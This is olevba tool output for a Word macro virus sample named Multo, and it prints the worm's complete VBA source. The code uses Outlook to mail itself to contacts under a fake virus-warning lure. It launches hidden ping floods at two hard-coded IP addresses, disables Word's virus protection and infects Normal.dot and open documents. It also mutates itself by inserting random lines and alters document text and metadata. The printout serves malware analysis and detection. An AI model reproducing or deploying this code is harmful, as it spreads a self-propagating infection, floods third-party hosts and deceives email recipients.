olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Multo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Multo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Multo.bas 
in file: ./Virus.MSWord.Multo - OLE stream: 'Macros/VBA/Multo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'VirusName: Multo
'Author Name: Lucky Warrior
'Date and Time:10/21/99 9:15:55 PM
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953

    Rem 69.43291    33.60891    87.74782    100.5201    38.26932




    Rem 184.6139    4.719319    49.89395    108.5479    25.36696
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164



'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'AutoOpen
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = 0
Randomize                                                                                                             Set oa = CreateObject("Outlook.Application")
Set mn = oa.GetNameSpace("MAPI")
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
If oa = "Outlook" Then
mn.Logon "profile", "password"
For y = 1 To mn.AddressLists.Count
x = 1
Set ab = mn.AddressLists(y)
Set Multo = oa.CreateItem(0)
For z = 1 To ab.AddressEntries.Count
vi = ab.AddressEntries(x)
Multo.Recipients.Add vi
x = x + 1
If x > 60 Then z = ab.AddressEntries.Count
Next z
Multo.Subject = "Fwd: VIRUS WARNING!!!"
    Rem 320.5001    74.30288    84.834  16.13545    37.12873
Multo.Body = "Somebody by the nickname of Lucky Warrior is sending out a virus that could harm your computer. DO NOT OPEN ANYTHING FROM HIM. MICROSOFT & AOL has said that this is a very dangerous virus. Attached herewith are the info & instruction on how to remove this virus, just in case you encountered this. Please practice cautionary measures and forward this to all your on-line friends ASAP."
Multo.Attachments.Add ActiveWorkbook.FullName
Multo.Send
vi = ""
Next y
mn.Logoff
End If
q = Int(6 * Rnd)
If q = 2 Then
Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 205.136.165.243", vbHide
ElseIf q = 4 Then
Shell "ping -t -l" & Str(Int(60000 * Rnd)) & " -w 1 208.160.226.2", vbHide
End If
    Rem 273.9573    72.71031    151.2449    117.6115    0.7145082
End Sub


    Rem 265.155 59.88262    73.03526    162.7873    13.86772
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'AutoClose
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub AutoClose()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
DocInfect = True
End If
Next
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
GlobInfect = True
End If
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
    Rem 311.3346    63.31712    5.670414    142.9512    23.69093
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
    Rem 58.3537 0.0192976   85.88705    118.2699    26.65668
Call Polymorphic
    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
End Sub

    Rem 238.8151    61.36893    8.560724    106.6425    22.9663

    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
'AutoExec
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
Sub AutoExec()
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
On Error Resume Next
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
Call Payload
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
Application.ScreenUpdating = False
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
    Rem 232.0716    58.68085    72.1599 58.03164    3.631286
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
DocInfect = True
    Rem 317.9951    39.94056    65.10947    170.113 48.24783
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
End If
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call Polymorphic
End Sub
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
    Rem 263.681 23.165  48.31168    139.4532    0.6868644

    Rem 416.8546    34.42089    108.4716    90.4417 25.17314
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'FileSave
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub FileSave()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
    Rem 367.5885    3.224816    8.743782    101.5752    15.42581
DocInfect = False
GlobInfect = False
    Rem 242.0553    49.20573    14.26456    33.19647    13.89442
    Rem 149.9795    72.74387    123.2115    103.6573    21.14841
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Multo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Multo" Then
GlobInfect = True
End If
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
    Rem 438.9426    0.7534742   152.5757    13.25416    14.37168
Options.SaveNormalPrompt = False
    Rem 405.0079    22.51051    58.88897    2.559804    14.43829
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Multo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call Polymorphic
ActiveDocument.Save
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ToolsMacro macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ToolsMacro()
Call Polymorphic
    Rem 74.13863    4.769349    38.92971    136.5434    46.61113
Beep
End Sub

    Rem 271.223 66.61842    3.001337    37.86636    3.623713
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
'ViewVBCode macro
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ViewVBCode()
Call Polymorphic
Beep
End Sub

    Rem 169.959 76.95625    139.4313    10.12263    46.52827
    Rem 169.959 76.95625    139.4313    10.12263    46.52827
    Rem 169.959 76.95625    139.4313    10.12263    46.52827
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ToolsCustomize macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 390.1221    7.452207    86.69975    74.76775    3.595181
Sub ToolsCustomize()
Call Polymorphic
Beep
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066
    Rem 37.26157    15.3538 108.6261    81.75741    17.49413
End Sub
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'FileTemplates macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub FileTemplates()
Call Polymorphic
Beep
End Sub


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Polymorphic macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub Polymorphic()
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("Multo").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("Multo").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Payload macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub Payload()
  On Error Resume Next
  With Selection.Find
  .Text = "for"
  .Replacement.Text = "Multo"
  .Wrap = wdFindContinue
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  ActiveDocument.SaveAs ActiveDocument.FullName
  With Dialogs(wdDialogFileSummaryInfo)
  .Author = "Lucky Warrior"
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
    Rem 346.3837    46.47028    96.90775    48.24789    24.90016
  .Comments = "Multo by Lucky Warrior"
  .Execute
  End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|OPEN                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |205.136.165.243     |IPv4 address                                 |
|IOC       |208.160.226.2       |IPv4 address                                 |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

